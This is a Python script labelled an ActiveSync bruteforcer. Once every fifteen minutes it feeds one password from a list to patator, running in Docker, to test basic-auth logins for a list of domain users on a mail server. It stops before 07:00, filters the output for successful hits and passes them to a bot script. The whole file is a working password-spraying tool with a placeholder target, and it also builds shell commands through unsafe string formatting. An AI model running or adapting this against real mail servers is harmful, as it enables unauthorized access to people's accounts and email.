import os
import time
import datetime
import argparse


parser = argparse.ArgumentParser(description='ActiveSync Bruteforcer')
parser.add_argument('-p', '--passwordsfile', help='File of passwords')
args = parser.parse_args()

os.system('rm -f /error.txt')
data = []
with open(args.passwordsfile, 'r') as password:
	data = password.read().splitlines()
curent_date = datetime.datetime.today().strftime('%Y-%m-%d')
j = 0
for i in data:
	j += 1
	curent_time = str(datetime.datetime.now().time())
	needed_time = curent_time.split(':')
	if needed_time[0] == '07':
		a = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
		err = a + ' - Error: Time expired. Current position: ' + str(j) +'/24'
		os.system("echo %s > error.txt" % (err))
		break
	with open('/userpass/pass.txt', 'w') as f:
		f.write(i)
	os.system("sudo docker run -t --add-host mail.site.com:10.10.10.10 --rm -v /userpass:/mnt patator http_fuzz auth_type=basic url='' user_pass='domain\FILE1:FILE0' 0=/mnt/pass.txt 1=/mnt/user.txt -x ignore:code=401 >> /result/%s.txt" % (curent_date))
	time.sleep(900)

if os.path.isfile('/error.txt'):
	os.system('python3 bot.py --f error.txt')
os.system("cat /result/%s.txt | grep -e '500' -e 'xxx' | cut -d: -f5 | awk -F\| '{print $1}' | uniq -u |sort | awk '{$1=$1};1' >> /res.tmp" % (curent_date))


if os.stat("/res.tmp").st_size == 0:
    print('no weak password')
else:
    os.system("python3 bot.py --f res.tmp")

os.system("rm -f res.tmp")
